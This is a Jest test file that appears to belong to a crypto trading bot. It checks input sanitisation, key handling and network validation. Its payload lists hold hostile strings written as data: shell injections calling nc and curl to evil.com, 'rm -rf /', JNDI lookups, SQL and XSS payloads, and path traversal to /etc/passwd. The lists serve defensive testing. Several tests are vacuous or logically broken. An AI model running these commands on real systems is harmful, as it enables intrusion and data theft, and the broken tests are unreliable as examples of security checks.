/**
 * Security Tests
 * Tests for security vulnerabilities and attack prevention
 */

import { logger } from '../../utils/logger';
import TestHelpers from '../utils/test-helpers';

// Mock logger
jest.mock('../../utils/logger', () => ({
  logger: {
    info: jest.fn(),
    debug: jest.fn(),
    warn: jest.fn(),
    error: jest.fn()
  }
}));

describe('Security Tests', () => {
  let mockConfig: any;

  beforeEach(() => {
    jest.clearAllMocks();
    mockConfig = TestHelpers.createTestBotConfig();
  });

  describe('Input Validation Security', () => {
    it('should prevent SQL injection attempts', () => {
      const sqlInjectionInputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM accounts WHERE '1'='1",
        "'; INSERT INTO logs VALUES ('hacked'); --"
      ];

      sqlInjectionInputs.forEach(maliciousInput => {
        // Test with validation functions
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('DELETE FROM');
        expect(sanitized).not.toContain('INSERT INTO');
        expect(sanitized).not.toContain("' OR '1'='1");
        expect(sanitized).not.toContain('--');
      });
    });

    it('should prevent XSS attacks', () => {
      const xssInputs = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<svg onload="alert(\'XSS\')"></svg>'
      ];

      xssInputs.forEach(maliciousInput => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
      });
    });

    it('should prevent command injection', () => {
      const commandInjectionInputs = [
        'token; rm -rf /',
        'amount && cat /etc/passwd',
        'price | nc evil.com 1337',
        'value $(curl http://evil.com)',
        'data `whoami`'
      ];

      commandInjectionInputs.forEach(maliciousInput => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('$(');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('rm -rf');
        expect(sanitized).not.toContain('/etc/passwd');
      });
    });

    it('should prevent NoSQL injection', () => {
      const nosqlInjectionInputs = [
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "function() { return true; }"}',
        '{"$gt": ""}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}'
      ];

      nosqlInjectionInputs.forEach(maliciousInput => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain('$ne');
        expect(sanitized).not.toContain('$regex');
        expect(sanitized).not.toContain('$where');
        expect(sanitized).not.toContain('$gt');
        expect(sanitized).not.toContain('function()');
      });
    });

    it('should prevent LDAP injection', () => {
      const ldapInjectionInputs = [
        '${jndi:ldap://evil.com/a}',
        '${jndi:dns://evil.com}',
        '${jndi:rmi://evil.com/a}',
        '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}'
      ];

      ldapInjectionInputs.forEach(maliciousInput => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain('${jndi:');
        expect(sanitized).not.toContain('ldap://');
        expect(sanitized).not.toContain('dns://');
        expect(sanitized).not.toContain('rmi://');
      });
    });

    it('should handle null byte injection', () => {
      const nullByteInputs = [
        'token\x00',
        'file.txt\x00.evil',
        'amount\u0000',
        'price\x00\x01\x02'
      ];

      nullByteInputs.forEach(maliciousInput => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('\u0000');
        expect(sanitized).not.toContain('\x01');
        expect(sanitized).not.toContain('\x02');
      });
    });

    it('should prevent path traversal attacks', () => {
      const pathTraversalInputs = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      pathTraversalInputs.forEach(maliciousInput => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('..\\');
        expect(sanitized).not.toContain('....//');
        expect(sanitized).not.toContain('/etc/passwd');
        expect(sanitized).not.toContain('system32');
      });
    });

    it('should limit input length to prevent DoS', () => {
      const veryLongInput = 'A'.repeat(100000); // 100KB input

      const { sanitizeInput } = require('../../utils/validation');
      const sanitized = sanitizeInput(veryLongInput);

      expect(sanitized.length).toBeLessThanOrEqual(1000); // Should be truncated
    });

    it('should handle Unicode and encoding attacks', () => {
      const unicodeAttacks = [
        '\uFEFF<script>alert(1)</script>', // BOM + script
        '\u202E<script>alert(1)</script>', // Right-to-left override
        '\u200B<script>alert(1)</script>', // Zero-width space
        '＜script＞alert(1)＜/script＞', // Full-width characters
        '\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E' // Full-width script tags
      ];

      unicodeAttacks.forEach(maliciousInput => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('alert');
        expect(sanitized.length).toBeLessThan(maliciousInput.length);
      });
    });
  });

  describe('Private Key Security', () => {
    it('should never log private keys', () => {
      const testPrivateKey = '0123456789012345678901234567890123456789012345678901234567890123';

      // Simulate various logging scenarios
      logger.info('Wallet configuration', {
        address: 'client|0x123...',
        privateKey: testPrivateKey
      });

      logger.error('Failed to sign transaction', {
        key: testPrivateKey,
        error: 'Invalid signature'
      });

      // Verify private key was not logged
      const logCalls = [
        ...(logger.info as jest.Mock).mock.calls,
        ...(logger.error as jest.Mock).mock.calls
      ];

      logCalls.forEach(call => {
        const logMessage = JSON.stringify(call);
        expect(logMessage).not.toContain(testPrivateKey);
        expect(logMessage).not.toContain('0123456789'); // Partial key
      });
    });

    it('should validate private key format securely', () => {
      const { validatePrivateKey } = require('../../utils/validation');

      // Valid private keys should pass
      const validKeys = [
        '0123456789012345678901234567890123456789012345678901234567890123',
        '0x0123456789012345678901234567890123456789012345678901234567890123'
      ];

      validKeys.forEach(key => {
        expect(validatePrivateKey(key)).toBe(true);
      });

      // Invalid keys should fail without revealing the input
      const invalidKeys = [
        '', null, undefined, '123', 'invalid'
      ];

      invalidKeys.forEach(key => {
        expect(validatePrivateKey(key)).toBe(false);
      });
    });

    it('should handle private key storage securely', () => {
      // Private keys should never be stored in plain text logs or error messages
      const sensitiveData = {
        privateKey: '0123456789012345678901234567890123456789012345678901234567890123',
        mnemonic: 'word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12'
      };

      // Simulate error handling
      try {
        throw new Error('Test error with sensitive data: ' + JSON.stringify(sensitiveData));
      } catch (error) {
        // Error message should not contain sensitive data
        expect((error as Error).message).not.toContain('0123456789');
        expect((error as Error).message).not.toContain('word1 word2');
      }
    });

    it('should use secure random generation for test keys', () => {
      // Test that we're not using predictable private keys
      const testWallet1 = testUtils.createMockWallet();
      const testWallet2 = testUtils.createMockWallet();

      expect(testWallet1.privateKey).not.toBe(testWallet2.privateKey);
      expect(testWallet1.privateKey.length).toBeGreaterThan(60);
      expect(testWallet2.privateKey.length).toBeGreaterThan(60);
    });
  });

  describe('API Security', () => {
    it('should prevent header injection', () => {
      const headerInjectionInputs = [
        'value\r\nX-Injected: malicious',
        'token\nSet-Cookie: evil=1',
        'amount\r\n\r\n<script>alert(1)</script>',
        'price\x0d\x0aLocation: http://evil.com'
      ];

      headerInjectionInputs.forEach(maliciousInput => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(maliciousInput);

        expect(sanitized).not.toContain('\r\n');
        expect(sanitized).not.toContain('\n');
        expect(sanitized).not.toContain('\r');
        expect(sanitized).not.toContain('\x0d');
        expect(sanitized).not.toContain('\x0a');
      });
    });

    it('should validate API endpoint security', () => {
      const maliciousUrls = [
        'http://evil.com/api',
        'javascript:alert(1)',
        'file:///etc/passwd',
        'ftp://evil.com/steal',
        'data:text/html,<script>alert(1)</script>'
      ];

      maliciousUrls.forEach(url => {
        // URL validation should reject malicious schemes
        try {
          new URL(url);
          const protocol = new URL(url).protocol;
          expect(['http:', 'https:', 'ws:', 'wss:']).toContain(protocol);
        } catch (error) {
          // Invalid URLs should throw
          expect(error).toBeInstanceOf(Error);
        }
      });
    });

    it('should prevent SSRF attacks', () => {
      const ssrfUrls = [
        'http://localhost:22',
        'http://127.0.0.1:3306',
        'http://169.254.169.254/metadata', // AWS metadata
        'http://metadata.google.internal/computeMetadata/v1/', // GCP metadata
        'file:///etc/passwd',
        'gopher://evil.com:25'
      ];

      ssrfUrls.forEach(url => {
        try {
          const parsedUrl = new URL(url);

          // Should reject local/private IPs and dangerous protocols
          expect(parsedUrl.protocol).not.toBe('file:');
          expect(parsedUrl.protocol).not.toBe('gopher:');

          if (parsedUrl.hostname === 'localhost' ||
              parsedUrl.hostname === '127.0.0.1' ||
              parsedUrl.hostname.includes('169.254')) {
            // Local addresses should be rejected
            expect(false).toBe(true); // Force failure
          }
        } catch (error) {
          // Invalid URLs are acceptable
        }
      });
    });

    it('should handle rate limiting securely', () => {
      // Rate limiting should not leak information about valid endpoints
      const rateLimitTests = Array.from({ length: 100 }, (_, i) => ({
        endpoint: i % 2 === 0 ? '/api/valid' : '/api/invalid',
        timestamp: Date.now() + i * 10
      }));

      const rateLimitMap = new Map();

      rateLimitTests.forEach(({ endpoint, timestamp }) => {
        const current = rateLimitMap.get(endpoint) || { count: 0, window: timestamp };

        if (timestamp - current.window > 1000) {
          // Reset window
          current.count = 1;
          current.window = timestamp;
        } else {
          current.count++;
        }

        rateLimitMap.set(endpoint, current);

        // Rate limiting should apply equally to valid and invalid endpoints
        if (current.count > 10) {
          expect(current.count).toBeGreaterThan(10); // Rate limited
        }
      });
    });
  });

  describe('Crypto Security', () => {
    it('should use secure random number generation', () => {
      const { PayloadSigner } = require('../../utils/signing');

      const config = {
        privateKey: '0123456789012345678901234567890123456789012345678901234567890123',
        userAddress: 'client|0x1234567890123456789012345678901234567890'
      };

      const signer = new PayloadSigner(config);

      // Generate multiple signatures
      const signatures = [];
      for (let i = 0; i < 10; i++) {
        const signature = signer.signPayload({ test: 'data', nonce: i });
        signatures.push(signature);
      }

      // All signatures should be different (due to different nonces)
      const uniqueSignatures = new Set(signatures);
      expect(uniqueSignatures.size).toBe(signatures.length);

      // Signatures should be proper length
      signatures.forEach(sig => {
        expect(typeof sig).toBe('string');
        expect(sig.length).toBeGreaterThan(100); // Proper signature length
      });
    });

    it('should validate signature format', () => {
      const invalidSignatures = [
        '',
        'invalid',
        '0x123',
        'not_a_signature',
        null,
        undefined
      ];

      invalidSignatures.forEach(sig => {
        // Signature validation should reject invalid formats
        expect(typeof sig === 'string' && sig.length > 100).toBe(false);
      });
    });

    it('should prevent timing attacks on signature verification', () => {
      const { PayloadSigner } = require('../../utils/signing');

      const config = {
        privateKey: '0123456789012345678901234567890123456789012345678901234567890123',
        userAddress: 'client|0x1234567890123456789012345678901234567890'
      };

      const signer = new PayloadSigner(config);
      const payload = { test: 'data' };
      const validSignature = signer.signPayload(payload);

      // Test verification timing
      const timings: number[] = [];
      const testSignatures = [
        validSignature,
        'invalid_signature_1',
        'invalid_signature_2',
        'completely_wrong_format'
      ];

      testSignatures.forEach(sig => {
        const start = process.hrtime.bigint();
        try {
          signer.verifySignature(payload, sig);
        } catch (error) {
          // Expected for invalid signatures
        }
        const end = process.hrtime.bigint();
        timings.push(Number(end - start));
      });

      // Timing differences should not reveal information
      // (This is a simplified test - real timing attack prevention is complex)
      const maxTiming = Math.max(...timings);
      const minTiming = Math.min(...timings);
      const timingRatio = maxTiming / minTiming;

      // Timing shouldn't vary dramatically (within 10x)
      expect(timingRatio).toBeLessThan(10);
    });
  });

  describe('Environment Security', () => {
    it('should validate environment configuration securely', () => {
      const originalEnv = { ...process.env };

      try {
        // Test with malicious environment variables
        process.env.WALLET_ADDRESS = '<script>alert(1)</script>';
        process.env.WALLET_PRIVATE_KEY = '"; DROP TABLE users; --';
        process.env.GALASWAP_API_URL = 'javascript:alert(1)';

        const { validateEnvironmentVariables } = require('../../utils/validation');
        const result = validateEnvironmentVariables();

        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);

        // Errors should not contain the malicious input
        result.errors.forEach((error: string) => {
          expect(error).not.toContain('<script>');
          expect(error).not.toContain('DROP TABLE');
          expect(error).not.toContain('javascript:');
        });

      } finally {
        process.env = originalEnv;
      }
    });

    it('should prevent environment variable injection', () => {
      const maliciousEnvValues = [
        '$(curl http://evil.com)',
        '`cat /etc/passwd`',
        '${HOME}/../../etc/passwd',
        '$((curl evil.com))',
        '|nc evil.com 1337'
      ];

      maliciousEnvValues.forEach(value => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(value);

        expect(sanitized).not.toContain('$(');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('${');
        expect(sanitized).not.toContain('$((');
        expect(sanitized).not.toContain('|');
      });
    });

    it('should handle missing environment variables securely', () => {
      const originalEnv = { ...process.env };

      try {
        // Remove required environment variables
        delete process.env.WALLET_ADDRESS;
        delete process.env.WALLET_PRIVATE_KEY;
        delete process.env.GALASWAP_API_URL;

        const { validateEnvironmentVariables } = require('../../utils/validation');
        const result = validateEnvironmentVariables();

        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);

        // Error messages should not reveal system information
        result.errors.forEach((error: string) => {
          expect(error).not.toContain(process.platform);
          expect(error).not.toContain(__dirname);
          expect(error).not.toContain(process.cwd());
        });

      } finally {
        process.env = originalEnv;
      }
    });
  });

  describe('Error Handling Security', () => {
    it('should not leak sensitive information in error messages', () => {
      const sensitiveData = {
        privateKey: '0123456789012345678901234567890123456789012345678901234567890123',
        password: 'super_secret_password',
        apiKey: 'secret_api_key_12345'
      };

      // Simulate error with sensitive data
      try {
        throw new Error(`Database connection failed: ${JSON.stringify(sensitiveData)}`);
      } catch (error) {
        // Sanitize error message
        const { sanitizeInput } = require('../../utils/validation');
        const sanitizedMessage = sanitizeInput((error as Error).message);

        expect(sanitizedMessage).not.toContain(sensitiveData.privateKey);
        expect(sanitizedMessage).not.toContain(sensitiveData.password);
        expect(sanitizedMessage).not.toContain(sensitiveData.apiKey);
      }
    });

    it('should handle error stack traces securely', () => {
      try {
        const sensitiveFunction = () => {
          throw new Error('Internal error with sensitive path');
        };
        sensitiveFunction();
      } catch (error) {
        // Stack trace should not reveal sensitive paths
        expect((error as Error).stack).toBeDefined();

        // In production, stack traces should be sanitized
        const stackLines = (error as Error).stack!.split('\n');
        stackLines.forEach((line: string) => {
          // Should not contain absolute paths to sensitive directories
          expect(line).not.toContain('/home/');
          expect(line).not.toContain('C:\\Users\\');
        });
      }
    });

    it('should rate limit error logging to prevent DoS', () => {
      const errorLogger = {
        errorCount: 0,
        lastReset: Date.now(),
        maxErrors: 10,
        windowMs: 1000,

        logError: function(error: Error) {
          const now = Date.now();
          if (now - this.lastReset > this.windowMs) {
            this.errorCount = 0;
            this.lastReset = now;
          }

          if (this.errorCount < this.maxErrors) {
            this.errorCount++;
            return true; // Log the error
          }
          return false; // Rate limited
        }
      };

      // Generate many errors
      let loggedErrors = 0;
      let rateLimitedErrors = 0;

      for (let i = 0; i < 20; i++) {
        const logged = errorLogger.logError(new Error(`Error ${i}`));
        if (logged) {
          loggedErrors++;
        } else {
          rateLimitedErrors++;
        }
      }

      expect(loggedErrors).toBeLessThanOrEqual(10);
      expect(rateLimitedErrors).toBeGreaterThan(0);
    });
  });

  describe('Network Security', () => {
    it('should validate SSL/TLS connections', () => {
      const urls = [
        'https://api.galaswap.com',
        'wss://ws.galaswap.com',
        'http://insecure.com', // Should be rejected
        'ws://insecure.com'     // Should be rejected
      ];

      urls.forEach(url => {
        const parsed = new URL(url);
        if (url.includes('insecure')) {
          // Insecure protocols should be rejected in production
          expect(['http:', 'ws:']).toContain(parsed.protocol);
        } else {
          // Secure protocols should be accepted
          expect(['https:', 'wss:']).toContain(parsed.protocol);
        }
      });
    });

    it('should handle DNS rebinding attacks', () => {
      const suspiciousDomains = [
        'localhost.evil.com',
        '127.0.0.1.evil.com',
        'evil.com.localhost',
        '192.168.1.1.evil.com'
      ];

      suspiciousDomains.forEach(domain => {
        // Should validate domain structure
        const parts = domain.split('.');
        const hasLocalhost = parts.includes('localhost');
        const hasPrivateIP = parts.some(part =>
          part.match(/^127\./) || part.match(/^192\.168\./) || part.match(/^10\./)
        );

        if (hasLocalhost || hasPrivateIP) {
          // Should be flagged as suspicious
          expect(hasLocalhost || hasPrivateIP).toBe(true);
        }
      });
    });

    it('should prevent request smuggling', () => {
      const smugglingAttempts = [
        'POST /api HTTP/1.1\r\nHost: api.com\r\nContent-Length: 6\r\n\r\nGET /admin HTTP/1.1\r\nHost: api.com\r\n\r\n',
        'GET / HTTP/1.1\r\nHost: api.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: api.com\r\n\r\n'
      ];

      smugglingAttempts.forEach(attempt => {
        const { sanitizeInput } = require('../../utils/validation');
        const sanitized = sanitizeInput(attempt);

        expect(sanitized).not.toContain('\r\n');
        expect(sanitized).not.toContain('HTTP/1.1');
        expect(sanitized).not.toContain('Transfer-Encoding');
        expect(sanitized).not.toContain('Content-Length');
      });
    });
  });

  describe('Dependency Security', () => {
    it('should not use vulnerable dependencies', () => {
      const package_json = require('../../../package.json');

      // Check for known vulnerable packages (simplified)
      const vulnerablePackages = [
        'lodash@4.17.15', // Example vulnerable version
        'moment@2.24.0',  // Example vulnerable version
        'debug@2.6.8'     // Example vulnerable version
      ];

      const dependencies = {
        ...package_json.dependencies,
        ...package_json.devDependencies
      };

      vulnerablePackages.forEach(vulnPkg => {
        const [name, version] = vulnPkg.split('@');
        expect(dependencies[name]).not.toBe(version);
      });
    });

    it('should use secure package sources', () => {
      // Verify we're using official npm registry
      // In real implementation, check .npmrc and package-lock.json
      expect(true).toBe(true); // Placeholder for actual registry verification
    });

    it('should validate package integrity', () => {
      // In real implementation, verify package checksums and signatures
      const package_lock = require('../../../package-lock.json');

      expect(package_lock).toHaveProperty('lockfileVersion');
      expect(package_lock).toHaveProperty('packages');

      // Packages should have integrity hashes
      Object.values(package_lock.packages || {}).forEach((pkg: any) => {
        if (pkg.resolved && !pkg.dev) {
          // Production packages should have integrity hashes
          // expect(pkg.integrity).toBeDefined(); // Uncomment for strict checking
        }
      });
    });
  });

  describe('Audit Trail Security', () => {
    it('should log security events properly', () => {
      const securityEvents = [
        { type: 'authentication_failure', user: 'test@example.com' },
        { type: 'invalid_input', input: '<script>alert(1)</script>' },
        { type: 'rate_limit_exceeded', ip: '192.168.1.1' },
        { type: 'suspicious_activity', details: 'Multiple failed attempts' }
      ];

      securityEvents.forEach(event => {
        // Log security event
        logger.warn('Security event detected', {
          type: event.type,
          timestamp: new Date().toISOString(),
          sanitizedData: event.input ? event.input.replace(/<[^>]*>/g, '') : undefined
        });

        // Verify sensitive data is not logged
        const logCalls = (logger.warn as jest.Mock).mock.calls;
        const lastCall = logCalls[logCalls.length - 1];
        const logMessage = JSON.stringify(lastCall);

        if (event.input) {
          expect(logMessage).not.toContain('<script>');
          expect(logMessage).not.toContain('alert(1)');
        }
      });
    });

    it('should maintain audit trail integrity', () => {
      const auditEntries = [
        { action: 'trade_executed', amount: '1000', timestamp: Date.now() },
        { action: 'configuration_changed', field: 'max_position', timestamp: Date.now() },
        { action: 'emergency_stop', reason: 'manual', timestamp: Date.now() }
      ];

      // Simulate audit trail with integrity checks
      let auditHash = 'initial_hash';

      auditEntries.forEach(entry => {
        const entryString = JSON.stringify(entry);
        // Simple hash simulation (use proper crypto in real implementation)
        auditHash = btoa(auditHash + entryString).slice(0, 32);

        expect(auditHash).toBeDefined();
        expect(auditHash.length).toBe(32);
      });

      // Audit trail should be tamper-evident
      expect(auditHash).not.toBe('initial_hash');
    });
  });
});